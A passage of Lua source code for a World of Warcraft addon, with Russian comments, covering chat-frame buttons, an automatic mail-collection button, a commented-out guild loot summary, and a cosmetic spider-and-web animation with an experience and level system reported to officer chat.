                    local currentFrame = GetCurrentChatFrame()
                    if currentFrame and currentFrame.editBox then
                        currentFrame.editBox:SetText("/g ")
                        currentFrame.editBox:SetFocus()
                        currentFrame.editBox:HighlightText()
                        SetTextColor("guild")
                    end
                end
            end
        end
    end)
    
    eventFrame:RegisterEvent("FRIENDLIST_UPDATE")
    eventFrame:RegisterEvent("PLAYER_ENTERING_WORLD")
    
    -- Функция обновления цвета для вызова извне
    socialBtn.UpdateColor = function()
        SetTextColor(lastChatType)
    end
    
    -- Инициализация
    socialBtn:Show()
    UpdateSocialCount()
    
    -- Сохраняем ссылки
    frame.socialButton = socialBtn
    frame.menuButton = button
    frame.scrollButton = downBtn
    frame.settingsButton = settingsBtn
    frame.settingsPanel = settingsPanel
end

-- Создаём кнопки для всех чат-фреймов
for i = 1, NUM_CHAT_WINDOWS do
    local frame = _G["ChatFrame" .. i]
    if frame then 
        CreateChatMenuButton(frame)
    end
end







-- -- Таблицы для хранения итогов
-- local lootSummary = {
--     moneyStrings = {},
--     items = {}  -- [название] = {count, link}
-- }

-- -- Функция очистки сообщения от escape-последовательностей
-- local function CleanMessage(msg)
--     msg = string.gsub(msg, "|4([^:]+):[^:]+:[^;]+;", "%1")
--     msg = string.gsub(msg, "|", "")
--     msg = string.gsub(msg, "%s+", " ")
--     msg = string.gsub(msg, "^%s+", "")
--     msg = string.gsub(msg, "%s+$", "")
--     return msg
-- end

-- -- Функция извлечения названия и ссылки предмета
-- local function ExtractItemInfo(msg)
--     -- Ищем ссылку предмета: |cff......|h[Название]|h|r или просто [Название]
--     local link = string.match(msg, "(|c%x+|Hitem:%d+.-|h.-|h|r)")
--     local name = string.match(msg, "%[(.-)%]")
--     return name, link
-- end

-- -- Функция формирования чистого сообщения для гильдчата
-- local function FormatForGuild(event, msg)
--     if event == "CHAT_MSG_MONEY" then
--         return CleanMessage(msg)
--     elseif event == "CHAT_MSG_LOOT" then
--         local name, link = ExtractItemInfo(msg)
--         if name then
--             if link then
--                 return "Ваша добыча: " .. link
--             else
--                 return "Ваша добыча: [" .. name .. "]."
--             end
--         end
--     end
--     return nil
-- end

-- -- Нормализация денег
-- local function NormalizeMoney(gold, silver, copper)
--     if copper >= 100 then
--         silver = silver + math.floor(copper / 100)
--         copper = copper % 100
--     end
--     if silver >= 100 then
--         gold = gold + math.floor(silver / 100)
--         silver = silver % 100
--     end
--     return gold, silver, copper
-- end

-- -- Функция вывода итогов в гильдчат
-- local function PrintSummary()
--     -- Суммируем все сохранённые деньги
--     local totalGold, totalSilver, totalCopper = 0, 0, 0
    
--     for _, moneyStr in ipairs(lootSummary.moneyStrings) do
--         local g = tonumber(string.match(moneyStr, "(%d+) золот"))
--         local s = tonumber(string.match(moneyStr, "(%d+) серебр"))
--         local c = tonumber(string.match(moneyStr, "(%d+) мед"))
--         totalGold = totalGold + (g or 0)
--         totalSilver = totalSilver + (s or 0)
--         totalCopper = totalCopper + (c or 0)
--     end
    
--     local g, s, c = NormalizeMoney(totalGold, totalSilver, totalCopper)
    
--     local moneyStr = ""
--     if g > 0 or s > 0 or c > 0 then
--         local parts = {}
--         if g > 0 then table.insert(parts, g .. " золотых") end
--         if s > 0 then table.insert(parts, s .. " серебряных") end
--         if c > 0 then table.insert(parts, c .. " медных") end
--         moneyStr = table.concat(parts, ", ")
--     end
    
--     if moneyStr == "" and not next(lootSummary.items) then
--         SendChatMessage("Добычи пока нет.", "GUILD")
--         return
--     end
    
--     SendChatMessage("=== ИТОГИ ДОБЫЧИ ===", "GUILD")
    
--     if moneyStr ~= "" then
--         SendChatMessage("Деньги: " .. moneyStr, "GUILD")
--     end
    
--     if next(lootSummary.items) then
--         SendChatMessage("Предметы:", "GUILD")
--         for itemName, itemData in pairs(lootSummary.items) do
--             local link = itemData.link or "[" .. itemName .. "]"
--             SendChatMessage("  " .. link .. " x" .. itemData.count, "GUILD")
--         end
--     end
    
--     SendChatMessage("====================", "GUILD")
    
--     -- Сбрасываем
--     lootSummary.moneyStrings = {}
--     lootSummary.items = {}
-- end

-- -- Фрейм для отслеживания добычи И гильдчата
-- local f = CreateFrame("Frame")
-- f:RegisterEvent("CHAT_MSG_MONEY")
-- f:RegisterEvent("CHAT_MSG_LOOT")
-- f:RegisterEvent("CHAT_MSG_GUILD")

-- f:SetScript("OnEvent", function(self, event, msg, ...)
--     if event == "CHAT_MSG_GUILD" then
--         if msg == "-итоги" or string.find(msg, "^%-итоги") then
--             PrintSummary()
--         end
--     elseif event == "CHAT_MSG_MONEY" or event == "CHAT_MSG_LOOT" then
--         -- Формируем чистое сообщение
--         local guildMsg = FormatForGuild(event, msg)
        
--         if guildMsg then
--             -- Сохраняем для итогов
--             if event == "CHAT_MSG_MONEY" then
--                 table.insert(lootSummary.moneyStrings, guildMsg)
--             elseif event == "CHAT_MSG_LOOT" then
--                 local name, link = ExtractItemInfo(msg)
--                 if name then
--                     if not lootSummary.items[name] then
--                         lootSummary.items[name] = { count = 0, link = link }
--                     end
--                     lootSummary.items[name].count = lootSummary.items[name].count + 1
--                 end
--             end
            
--             -- Отправляем в гильдчат
--             SendChatMessage(guildMsg, "GUILD")
--         end
--     end
-- end)














----------------- СБОР ПОЧТЫ --------------
local btn = CreateFrame("Button", nil, UIParent, "UIPanelButtonTemplate")
btn:SetSize(128, 23)
btn:SetText("ЗАБРАТЬ ВСЕ")
btn:SetFrameStrata("HIGH")
btn:Hide()

local testQ = {}

btn:SetScript("OnClick", function(self, button)
    if testQ ~= nil then
        if testQ["mail"] == nil then
            testQ["mail"] = 1
        else
            testQ["mail"] = nil
        end
    end
    if testQ["mail"] == 1 then
        btn:SetText("..сбор..")
    else
        btn:SetText("ЗАБРАТЬ ВСЕ")
    end
end)

local f = CreateFrame("Frame")
f:RegisterEvent("MAIL_SHOW")
f:RegisterEvent("MAIL_CLOSED")
f:RegisterEvent("MAIL_INBOX_UPDATE")

f:SetScript("OnEvent", function()
    if MailFrame:IsVisible() and not SendMailFrame:IsVisible() then
        if not btn:IsVisible() then
            btn:ClearAllPoints()
            btn:SetPoint("TOPRIGHT", MailFrame, "TOPRIGHT", -55, -13)
            btn:Show()
        end
    else
        if btn:IsVisible() then
            btn:Hide()
            testQ["mail"] = nil
        end
        return
    end
    
    if InboxPrevPageButton:IsEnabled() ~= 0 then
        btn:Disable()
    else
        btn:Enable()
    end
    
    if testQ["mail"] == 1 then
        btn:SetText("..сбор..")
    else
        btn:SetText("ЗАБРАТЬ ВСЕ")
    end
end)

-- Сбор почты
local frameTime = CreateFrame("FRAME")
local timeElapsed = 0
frameTime:HookScript("OnUpdate", function(self, elapsed)
    if MailFrame:IsVisible() then
        timeElapsed = timeElapsed + elapsed
        if timeElapsed > 0.01 then
            timeElapsed = 0
            if testQ["mail"] ~= nil then
                local x = GetInboxNumItems()
                if x >= 1 then
                    local l1, l2, l3, l4, l5, l6 = GetInboxHeaderInfo(1)
                    if tonumber(l6) == 0 then
                        AutoLootMailItem(1)
                        MailItem1Button:Click()
                        OpenMailDeleteButton:Click()
                        StaticPopup1Button2:Click()
                    end
                else
                    testQ["mail"] = nil
                end
            end
        end
    end
end)
----------------КОНЕЦ СБОРА ПОЧТЫ-------------------













































































































































































local ADDON_FOLDER = ...
if type(ADDON_FOLDER) ~= "string" or ADDON_FOLDER == "" then
    ADDON_FOLDER = "NSPauk"
end

if type(NSPauk) ~= "table" then
    NSPauk = {}
end

if type(nsDbc) ~= "table" then
    nsDbc = {}
end

NSPauk.initialized = false
NSPauk.nextInstanceId = 1

local function copyPoint(p)
    if not p then
        return { x = 0, y = 0 }
    end

    return { x = p.x or 0, y = p.y or 0 }
end

local function dist2(ax, ay, bx, by)
    local dx = (ax or 0) - (bx or 0)
    local dy = (ay or 0) - (by or 0)
    return dx * dx + dy * dy
end

local function dist(ax, ay, bx, by)
    return math.sqrt(dist2(ax, ay, bx, by))
end

local function getThreadTexCount(thread)
    local ref = thread and thread.ownerRef

    if not ref then
        return -1
    end

    if ref.conn and ref.conn.textures then
        return #ref.conn.textures
    end

    if ref.seg and ref.seg.textures then
        return #ref.seg.textures
    end

    return -1
end

NSPauk.DefaultConstants = {
    DELAY_AFTER_LOGIN = 3,
    STILL_WAIT = 5,
    SPEED_CHECK = 1,
    SPEED_THRESHOLD = 2,
    WEB_SIZE = 2,
    WEB_ALPHA = 0.55,
    SPIDER_SIZE = 64,
    FAST_MODE = 0.085,
    MAX_WEB_SEGS = 120000,
    FADE_DURATION = 10,
    DISABLE_TIME = 3600,
    MIN_ANCHOR_SIZE = 14,
    MIN_INNER_SIZE = 6,
    MIN_WEB_GAP = 22,
    MIN_CROSS_LEN = 4,
    MAX_VISIBLE_RECTS = 300,
    TARGET_COUNT_MIN = 3,
    TARGET_COUNT_MAX = 6,
    MAX_INSTANCES = 6,
    CROSS_ROW_SPACING = 20,
    MAX_CROSS_ROWS = 1600,
    ARC_SAMPLES = 256,
    MAIN_SAG_MIN = 0.06,
    MAIN_SAG_MAX = 0.16,
    CROSS_SAG_MIN = 0.05,
    CROSS_SAG_MAX = 0.13,
    INTERCROSS_SAG_MIN = 0.04,
    INTERCROSS_SAG_MAX = 0.10,
    INTERCROSS_SPACING = 20,
    SPIDER_SPEED_MIN = 30,
    SPIDER_SPEED_MAX = 65,
    TRAVEL_SPEED_MULT = 6,
    CROSS_SPEED_MULT = 1.15,
    MAIN_SPEED_MULT = 2.0,
    WEB_POINT_SPACING_MAX = 1,
    MAX_DROPS_PER_FRAME = 140,
    COMPLETE_PAUSE = 2.5,
    MONITOR_CHECK = 0.35,
    MOVEMENT_TOLERANCE = 2.0,
    TEAR_FADE_DURATION = 2.5,
    COCOON_CHANCE = 0.18,
    COCOON_WRAPS_MIN = 5,
    COCOON_WRAPS_MAX = 9,
    COCOON_LOOP_SEGS = 8,
    COCOON_DIAG_MIN = 3,
    COCOON_DIAG_MAX = 6,
    COCOON_MIN_WIDTH = 30,
    COCOON_MIN_AREA = 2000,
    COCOON_MAX_AREA = 180000,
    DISSOLVE_DURATION_MIN = 180,
    DISSOLVE_DURATION_MAX = 180,
    MIN_COCOON_ALPHA = 0.03,
    MAX_INTERCROSS_SEGS = 12000,
    MAX_INTERCROSS_PER_PAIR = 60,
    MOUSE_CHECK = 0.15,
    MOUSE_THREAD_DIST = 5,
    MOUSE_HOVER_LIMIT = 5,
    MOUSE_STREAK_RESET = 4,
    POINTS_PER_LEVEL = 60000,
    SESSION_FULL_POINTS = 60000,
    SESSION_EXP_PERCENT_MAX = 1.0,
    COCOON_EXP_PERCENT = 0.05,
    LIMIT_COCOON_INTERVAL = 1800,
    LIMIT_COCOON_RETRY = 60,
    CROSS_MAX_SECTOR_ANGLE = 160,
    WEB_THREAD_MIN_SEPARATION = 20,
    WEB_HUB_IGNORE_DIST = 100,
    WEB_TARGET_REROLL_ATTEMPTS = 8,
}

NSPauk.S = {
    phase = "init",
    initTimer = 0,
    speedTimer = 0,
    stillTimer = 0,
    completeTimer = 0,
    monitorTimer = 0,
    spider = nil,
    clickBtn = nil,
    instances = {},
    currentInstance = nil,
    tasks = {},
    taskIdx = 1,
    currentTask = nil,
    webPool = {},
    webCreated = 0,
    webPoints = 0,
    webAliveCount = 0,
    fades = {},
    disableTimer = 0,
    lastSpiderX = 0,
    lastSpiderY = 0,
    lastDropX = 0,
    lastDropY = 0,
    lastTaskT = 0,
    mouseTimer = 0,
    mouseOnThread = nil,
    mouseIdle = 0,
    cocoon = nil,
    digestedFrames = {},
    moveDur = 1,
    moveT = 0,
    SW = 1,
    SH = 1,
    activeFrame = nil,
    spiderFrame = nil,
    clickFrame = nil,
    mode = "base",
    session = {
        bestPoints = 0,
        bestExpAwarded = 0,
    },
    suppressSettle = false,
    limitReached = false,
    limitReturnPending = false,
    limitCocoonPending = false,
    limitWaitTimer = 0,
    limitHomePoint = nil,
}

NSPauk.C = {}
NSPauk.DB = nil

function NSPauk:EnsureDB()
    if type(nsDbc) ~= "table" then
        nsDbc = {}
    end

    if type(nsDbc["паук"]) ~= "table" then
        nsDbc["паук"] = {}
    end

    local db = nsDbc["паук"]

    if type(db.constants) ~= "table" then
        db.constants = {}
    end

    for key, value in pairs(self.DefaultConstants) do
        local current = db.constants[key]

        if current == nil then
            db.constants[key] = value
        elseif type(value) == "number" and (type(current) ~= "number" or current ~= current) then
            db.constants[key] = value
        end
    end

    if type(db.progress) ~= "table" then
        db.progress = { totalPoints = 0 }
    end

    if type(db.progress.totalPoints) ~= "number" or db.progress.totalPoints ~= db.progress.totalPoints then
        db.progress.totalPoints = 0
    end

    return db
end

function NSPauk:ApplyRuntimeConstants()
    local C = self.C

    C.ADDON = "NSPauk"
    C.CLICK_SOUND = "Interface\\AddOns\\" .. ADDON_FOLDER .. "\\libs\\bzd.ogg"
    C.CLICK_TEX = "Interface\\AddOns\\" .. ADDON_FOLDER .. "\\libs\\pxxx.tga"
    C.TEX_SPIDER = "Interface\\AddOns\\" .. ADDON_FOLDER .. "\\libs\\pauk.tga"
    C.TEX_WEB = "Interface\\AddOns\\" .. ADDON_FOLDER .. "\\libs\\pautina.tga"
    C.LEVELUP_SOUND = "Interface\\AddOns\\NSQC3\\libs\\lvlUp.ogg"

    C.EXCLUDE_FRAMES = {
        MinimapCluster = true,
    }

    C.EXCLUDE_FRAMES[C.ADDON .. "_WebHigh"] = true
    C.EXCLUDE_FRAMES[C.ADDON .. "_SpiderHigh"] = true
    C.EXCLUDE_FRAMES[C.ADDON .. "_ClickHigh"] = true

    local function num(value, default)
        if type(value) ~= "number" or value ~= value then
            return default
        end

        return value
    end

    C.INTERCROSS_SPACING = num(C.INTERCROSS_SPACING, C.CROSS_ROW_SPACING)

    C.LIMIT_COCOON_INTERVAL = num(C.LIMIT_COCOON_INTERVAL, 1800)
    if C.LIMIT_COCOON_INTERVAL <= 0 then
        C.LIMIT_COCOON_INTERVAL = 1800
    end

    C.LIMIT_COCOON_RETRY = num(C.LIMIT_COCOON_RETRY, 60)
    if C.LIMIT_COCOON_RETRY <= 0 then
        C.LIMIT_COCOON_RETRY = 60
    end

    C.MAX_WEB_SEGS = math.floor(num(C.MAX_WEB_SEGS, self.DefaultConstants.MAX_WEB_SEGS) + 0.5)
    if C.MAX_WEB_SEGS < 0 then
        C.MAX_WEB_SEGS = self.DefaultConstants.MAX_WEB_SEGS
    end

    C.WEB_POINT_SPACING_MAX = num(C.WEB_POINT_SPACING_MAX, self.DefaultConstants.WEB_POINT_SPACING_MAX)
    if C.WEB_POINT_SPACING_MAX <= 0 then
        C.WEB_POINT_SPACING_MAX = self.DefaultConstants.WEB_POINT_SPACING_MAX
    end

    C.WEB_ALPHA = num(C.WEB_ALPHA, self.DefaultConstants.WEB_ALPHA)
    if C.WEB_ALPHA < 0 then
        C.WEB_ALPHA = 0
    elseif C.WEB_ALPHA > 1 then
        C.WEB_ALPHA = 1
    end

    C.WEB_SIZE = num(C.WEB_SIZE, self.DefaultConstants.WEB_SIZE)
    if C.WEB_SIZE < 1 then
        C.WEB_SIZE = self.DefaultConstants.WEB_SIZE
    end

    C.MAX_DROPS_PER_FRAME = math.floor(num(C.MAX_DROPS_PER_FRAME, self.DefaultConstants.MAX_DROPS_PER_FRAME) + 0.5)
    if C.MAX_DROPS_PER_FRAME < 0 then
        C.MAX_DROPS_PER_FRAME = self.DefaultConstants.MAX_DROPS_PER_FRAME
    end

    C.CROSS_MAX_SECTOR_ANGLE = num(C.CROSS_MAX_SECTOR_ANGLE, 160)
    C.WEB_THREAD_MIN_SEPARATION = num(C.WEB_THREAD_MIN_SEPARATION, 20)
    C.WEB_HUB_IGNORE_DIST = num(C.WEB_HUB_IGNORE_DIST, 100)
    C.WEB_TARGET_REROLL_ATTEMPTS = math.floor(num(C.WEB_TARGET_REROLL_ATTEMPTS, 8) + 0.5)
    C.COCOON_MIN_WIDTH = num(C.COCOON_MIN_WIDTH, 30)
end

function NSPauk:LoadConstants()
    local db = self:EnsureDB()

    self.DB = db
    self.C = db.constants

    self:ApplyRuntimeConstants()
end

function NSPauk:ResetConstants()
    local db = self:EnsureDB()

    self.DB = db

    local constants = db.constants

    for key in pairs(constants) do
        constants[key] = nil
    end

    for key, value in pairs(self.DefaultConstants) do
        constants[key] = value
    end

    self.C = constants

    self:ApplyRuntimeConstants()
end

function NSPauk:ResetSessionRecord()
    self.S.session = {
        bestPoints = 0,
        bestExpAwarded = 0,
    }
end

function NSPauk:ResetProgress()
    local db = self:EnsureDB()

    self.DB = db
    db.progress.totalPoints = 0
    self.S.webPoints = 0

    self:ResetSessionRecord()
end

function NSPauk:Print(message)
    if DEFAULT_CHAT_FRAME and DEFAULT_CHAT_FRAME.AddMessage then
        DEFAULT_CHAT_FRAME:AddMessage(message)
    end
end

function NSPauk:PlayerHasGuild()
    if IsInGuild and IsInGuild() then
        return true
    end

    if GetGuildInfo then
        local guildName = GetGuildInfo("player")

        if guildName and guildName ~= "" then
            return true
        end
    end

    return false
end

function NSPauk:SendOfficer(text)
    self:Print(text)

    if self:PlayerHasGuild() and SendChatMessage then
        if type(pcall) == "function" then
            pcall(SendChatMessage, text, "OFFICER")
        else
            SendChatMessage(text, "OFFICER")
        end
    end
end

function NSPauk:AddExperience(amount)
    if type(amount) ~= "number" or amount ~= amount or amount <= 0 then
        return 0, 0, 0, 0
    end

    local db = self:EnsureDB()
    local progress = db.progress
    local perLevel = self.C.POINTS_PER_LEVEL or 60000

    if type(perLevel) ~= "number" or perLevel ~= perLevel or perLevel <= 0 then
        perLevel = 60000
    end

    amount = math.floor(amount + 0.5)

    if amount <= 0 then
        return 0, 0, 0, 0
    end

    local oldTotal = progress.totalPoints or 0
    local oldLevel = math.floor(oldTotal / perLevel)
    local newTotal = oldTotal + amount

    progress.totalPoints = newTotal

    local newLevel = math.floor(newTotal / perLevel)
    local left = perLevel - (newTotal % perLevel)
    local levelsGained = newLevel - oldLevel

    if levelsGained > 0 then
        if PlaySoundFile then
            PlaySoundFile(self.C.LEVELUP_SOUND or "Interface\\AddOns\\NSQC3\\libs\\lvlUp.ogg")
        end

        self:ShowLevelUpFrame()
    end

    return amount, newLevel, left, levelsGained
end

function NSPauk:AwardCocoonExperience(targetName)
    local C = self.C
    local perLevel = C.POINTS_PER_LEVEL or 60000

    if type(perLevel) ~= "number" or perLevel ~= perLevel or perLevel <= 0 then
        perLevel = 60000
    end

    local pct = C.COCOON_EXP_PERCENT

    if type(pct) ~= "number" or pct ~= pct or pct < 0 then
        pct = 0.05
    end

    if pct > 1 then
        pct = 1
    end

    local amount = math.floor(perLevel * pct + 0.5)

    if amount <= 0 then
        return
    end

    local _, level, left = self:AddExperience(amount)

    if type(targetName) == "string" and targetName ~= "" then
        self:SendOfficer(string.format(
            "Мой павук свил кокон и съел %s! Единоразово получено %d опыта (%.1f%% уровня). Уровень %d, до уровня %d",
            targetName,
            amount,
            pct * 100,
            level,
            left
        ))
    else
        self:SendOfficer(string.format(
            "Мой павук свил кокон и съел объект! Единоразово получено %d опыта (%.1f%% уровня). Уровень %d, до уровня %d",
            amount,
            pct * 100,
            level,
            left
        ))
    end
end

function NSPauk:CalcWebExperience(count)
    if type(count) ~= "number" or count ~= count or count <= 0 then
        return 0, 0, 0
    end

    count = math.floor(count + 0.5)

    if count <= 0 then
        return 0, 0, 0
    end

    local C = self.C or {}
    local full = C.SESSION_FULL_POINTS

    if type(full) ~= "number" or full ~= full or full <= 0 then
        full = C.POINTS_PER_LEVEL or 60000
    end

    if type(full) ~= "number" or full ~= full or full <= 0 then
        full = 60000
    end

    local maxPct = C.SESSION_EXP_PERCENT_MAX

    if type(maxPct) ~= "number" or maxPct ~= maxPct or maxPct < 0 then
        maxPct = 1
    end

    if maxPct > 1 then
        maxPct = 1
    end

    local pct = count / full

    if pct > maxPct then
        pct = maxPct
    end

    if pct < 0 then
        pct = 0
    end

    local expGain = math.floor(count * pct + 0.5)

    if expGain < 0 then
        expGain = 0
    end

    return expGain, pct, count
end

function NSPauk:SettleWebPoints(count)
    if type(count) ~= "number" or count ~= count or count <= 0 then
        return
    end

    count = math.floor(count + 0.5)

    if count <= 0 then
        return
    end

    local S = self.S

    if type(S.session) ~= "table" then
        self:ResetSessionRecord()
    end

    local session = S.session
    local oldBest = session.bestPoints or 0

    if count <= oldBest then
        return
    end

    local expGain = self:CalcWebExperience(count)

    if expGain <= 0 then
        expGain = 1
    end

    session.bestPoints = count
    session.bestExpAwarded = (session.bestExpAwarded or 0) + expGain

    local _, level, left = self:AddExperience(expGain)

    local C = self.C or {}
    local perLevel = C.POINTS_PER_LEVEL or 60000

    if type(perLevel) ~= "number" or perLevel ~= perLevel or perLevel <= 0 then
        perLevel = 60000
    end

    local full = C.SESSION_FULL_POINTS

    if type(full) ~= "number" or full ~= full or full <= 0 then
        full = perLevel
    end

    local levelPct = 0

    if perLevel > 0 then
        levelPct = expGain / perLevel * 100
    end

    local countPct = 0

    if full > 0 then
        countPct = count / full * 100
    end

    self:SendOfficer(string.format(
        "Рекорд сессии: %d (%.1f%% от %d), прошлый %d. Опыт +%d (%.2f%% уровня). Уровень %d, до уровня %d",
        count,
        countPct,
        full,
        oldBest,
        expGain,
        levelPct,
        level,
        left
    ))
end

function NSPauk:RecordWebLength(count)
    self:SettleWebPoints(count)
end

function NSPauk:ShowProgress()
    local S = self.S
    local C = self.C
    local db = self:EnsureDB()
    local progress = db.progress
    local perLevel = C.POINTS_PER_LEVEL or 60000

    if perLevel <= 0 then
        perLevel = 60000
    end

    local total = progress.totalPoints or 0
    local level = math.floor(total / perLevel)
    local left = perLevel - (total % perLevel)

    if left == perLevel then
        left = 0
    end

    local currentThreads = S.currentInstance and #S.currentInstance.conns or 0
    local session = S.session or { bestPoints = 0, bestExpAwarded = 0 }

    self:SendOfficer(string.format(
        "Павук: уровень %d, всего точек %d, до уровня %d",
        level,
        total,
        left
    ))

    self:SendOfficer(string.format(
        "Скорость %s-%s, размер %s, целей %s-%s, сейчас %d",
        tostring(C.SPIDER_SPEED_MIN),
        tostring(C.SPIDER_SPEED_MAX),
        tostring(C.SPIDER_SIZE),
        tostring(C.TARGET_COUNT_MIN),
        tostring(C.TARGET_COUNT_MAX),
        currentThreads
    ))

    self:SendOfficer(string.format(
        "Шаг точек %s, шаг перемычек %s, шанс кокона %s",
        tostring(C.WEB_POINT_SPACING_MAX),
        tostring(C.CROSS_ROW_SPACING),
        tostring(C.COCOON_CHANCE)
    ))

    self:SendOfficer(string.format(
        "Живых точек: %d/%s, лимит: %s",
        S.webAliveCount or 0,
        tostring(C.MAX_WEB_SEGS),
        S.limitReached and "достигнут" or "нет"
    ))

    self:SendOfficer(string.format(
        "Рекорд сессии: %d точек, учтено опыта за рекорды: %d",
        session.bestPoints or 0,
        session.bestExpAwarded or 0
    ))
end

function NSPauk:AnnounceSpiderKill()
    self:SendOfficer("Я зверски убиваю павука..тапкой!")
end

function NSPauk:GetScreenSize()
    local sw = GetScreenWidth and GetScreenWidth() or 0
    local sh = GetScreenHeight and GetScreenHeight() or 0

    if sw and sh and sw > 0 and sh > 0 then
        return sw, sh
    end

    if UIParent then
        local uw, uh = UIParent:GetWidth(), UIParent:GetHeight()

        if uw and uh and uw > 0 and uh > 0 then
            return uw, uh
        end
    end

    return 1, 1
end

function NSPauk:RandomFloat(min, max)
    min = tonumber(min) or 0
    max = tonumber(max) or min

    if min > max then
        min, max = max, min
    end

    return min + math.random() * (max - min)
end

function NSPauk:RandomInt(min, max)
    min = math.floor((tonumber(min) or 0) + 0.5)
    max = math.floor((tonumber(max) or 0) + 0.5)

    if min > max then
        min, max = max, min
    end

    if min == max then
        return min
    end

    return math.random(min, max)
end

function NSPauk:Bz(t, a, b, c)
    local m = 1 - t
    return m * m * a + 2 * m * t * b + t * t * c
end

function NSPauk:BzThread(thread, t)
    return self:Bz(t, thread.p0.x, thread.p1.x, thread.p2.x),
        self:Bz(t, thread.p0.y, thread.p1.y, thread.p2.y)
end

function NSPauk:ApproxThreadLength(thread)
    if not thread or not thread.p0 or not thread.p2 then
        return 1
    end

    local dx = thread.p2.x - thread.p0.x
    local dy = thread.p2.y - thread.p0.y
    local chord = math.sqrt(dx * dx + dy * dy)

    if not thread.p1 then
        return math.max(chord, 1)
    end

    local d1x = thread.p1.x - thread.p0.x
    local d1y = thread.p1.y - thread.p0.y
    local d2x = thread.p2.x - thread.p1.x
    local d2y = thread.p2.y - thread.p1.y

    local net = math.sqrt(d1x * d1x + d1y * d1y)
        + math.sqrt(d2x * d2x + d2y * d2y)

    return math.max((chord + net) / 2, 1)
end

function NSPauk:Shuffle(tbl)
    for i = #tbl, 2, -1 do
        local j = math.random(i)
        tbl[i], tbl[j] = tbl[j], tbl[i]
    end

    return tbl
end

function NSPauk:EdgePoint(rect, tx, ty)
    local cx = rect.cx
    local cy = rect.cy
    local dx = tx - cx
    local dy = ty - cy

    if dx == 0 and dy == 0 then
        return cx, cy
    end

    local sx, sy

    if dx == 0 then
        sx = 1e9
    else
        local half = (dx > 0) and (rect.right - cx) or (cx - rect.left)
        sx = half / math.abs(dx)
    end

    if dy == 0 then
        sy = 1e9
    else
        local half = (dy > 0) and (rect.top - cy) or (cy - rect.bottom)
        sy = half / math.abs(dy)
    end

    local s = math.min(sx, sy)

    if not s or s < 0 then
        s = 0
    end

    return cx + dx * s, cy + dy * s
end

function NSPauk:PointSegDist2(px, py, ax, ay, bx, by)
    local vx = bx - ax
    local vy = by - ay
    local wx = px - ax
    local wy = py - ay

    local c1 = wx * vx + wy * vy

    if c1 <= 0 then
        return wx * wx + wy * wy
    end

    local c2 = vx * vx + vy * vy

    if c1 >= c2 then
        local dx = px - bx
        local dy = py - by
        return dx * dx + dy * dy
    end

    local t = c1 / c2
    local projX = ax + vx * t
    local projY = ay + vy * t
    local dx = px - projX
    local dy = py - projY

    return dx * dx + dy * dy
end

function NSPauk:EffAlpha(f)
    if f.GetEffectiveAlpha then
        return f:GetEffectiveAlpha() or 1
    end

    return 1
end

function NSPauk:EffScale(f)
    local s = (f.GetEffectiveScale and f:GetEffectiveScale()) or 1

    if not s or s <= 0 then
        s = 1
    end

    return s
end

function NSPauk:VisibleTexture(r)
    local tex = r:GetTexture()

    if not tex or tex == "" then
        return false
    end

    local ra = (r.GetAlpha and r:GetAlpha()) or 1

    if ra <= 0.01 then
        return false
    end

    local _, _, _, va = r:GetVertexColor()

    if (va or 1) <= 0.01 then
        return false
    end

    return true
end

function NSPauk:VisibleText(r)
    local text = (r.GetText and r:GetText()) or nil

    if not text or text == "" then
        return false
    end

    if r.GetFont and not r:GetFont() then
        return false
    end

    local ra = (r.GetAlpha and r:GetAlpha()) or 1

    return ra > 0.01
end

function NSPauk:VisibleBackdrop(f)
    if not f.GetBackdrop then
        return false
    end

    local bd = f:GetBackdrop()

    if not bd then
        return false
    end

    if bd.bgFile and bd.bgFile ~= "" then
        if f.GetBackdropColor then
            local _, _, _, ba = f:GetBackdropColor()

            if (ba or 1) > 0.01 then
                return true
            end
        end
    end

    if bd.edgeFile and bd.edgeFile ~= "" then
        if f.GetBackdropBorderColor then
            local _, _, _, ea = f:GetBackdropBorderColor()

            if (ea or 1) > 0.01 then
                return true
            end
        end
    end

    return false
end

function NSPauk:DisplayName(f)
    local name = f.GetName and f:GetName()

    if name then
        return name
    end

    local p = f.GetParent and f:GetParent()
    local pn = p and p.GetName and p:GetName()

    return "(" .. (pn or "?") .. ")"
end

function NSPauk:ComputeFrameVisibleRect(f, uiScale, baseX, baseY, scrW, scrH)
    local C = self.C

    if not f or f == UIParent or f == WorldFrame then
        return nil
    end

    if self.F_HIGH and f == self.F_HIGH then
        return nil
    end

    local name = f.GetName and f:GetName()

    if name and C.EXCLUDE_FRAMES[name] then
        return nil
    end

    if not f.IsVisible or not f:IsVisible() then
        return nil
    end

    local fa = self:EffAlpha(f)

    if fa < 0.02 then
        return nil
    end

    if not uiScale then
        uiScale = self:EffScale(UIParent)
    end

    if not baseX then
        baseX = (UIParent.GetLeft and UIParent:GetLeft() or 0) * uiScale
    end

    if not baseY then
        baseY = (UIParent.GetBottom and UIParent:GetBottom() or 0) * uiScale
    end

    if not scrW then
        scrW = ((GetScreenWidth and GetScreenWidth()) or UIParent:GetWidth() or 1) * uiScale
    end

    if not scrH then
        scrH = ((GetScreenHeight and GetScreenHeight()) or UIParent:GetHeight() or 1) * uiScale
    end

    local fs = self:EffScale(f)
    local draws = false
    local ul, ur, ub, ut

    local function grow(l, r, b, t)
        if not ul then
            ul, ur, ub, ut = l, r, b, t
        else
            if l < ul then
                ul = l
            end

            if r > ur then
                ur = r
            end

            if b < ub then
                ub = b
            end

            if t > ut then
                ut = t
            end
        end

        draws = true
    end

    if self:VisibleBackdrop(f) then
        local l, r, b, t = f:GetLeft(), f:GetRight(), f:GetBottom(), f:GetTop()

        if l and r and b and t then
            grow(l * fs, r * fs, b * fs, t * fs)
        end
    end

    local fallbackUsed = false

    if f.GetRegions then
        for _, r in ipairs({ f:GetRegions() }) do
            if r.IsVisible and r:IsVisible() then
                local kind = r:GetObjectType()
                local ok = false

                if kind == "Texture" then
                    ok = self:VisibleTexture(r)
                elseif kind == "FontString" then
                    ok = self:VisibleText(r)
                end

                if ok then
                    local l, r2, b, t

                    if r.GetLeft then
                        l = r:GetLeft()
                        r2 = r:GetRight()
                        b = r:GetBottom()
                        t = r:GetTop()
                    end

                    if l and r2 and b and t then
                        grow(l * fs, r2 * fs, b * fs, t * fs)
                    elseif not fallbackUsed then
                        local fl, fr, fb, ft = f:GetLeft(), f:GetRight(), f:GetBottom(), f:GetTop()

                        if fl and fr and fb and ft then
                            fallbackUsed = true
                            grow(fl * fs, fr * fs, fb * fs, ft * fs)
                        end
                    end
                end
            end
        end
    end

    if not draws then
        return nil
    end

    local w = ur - ul
    local h = ut - ub

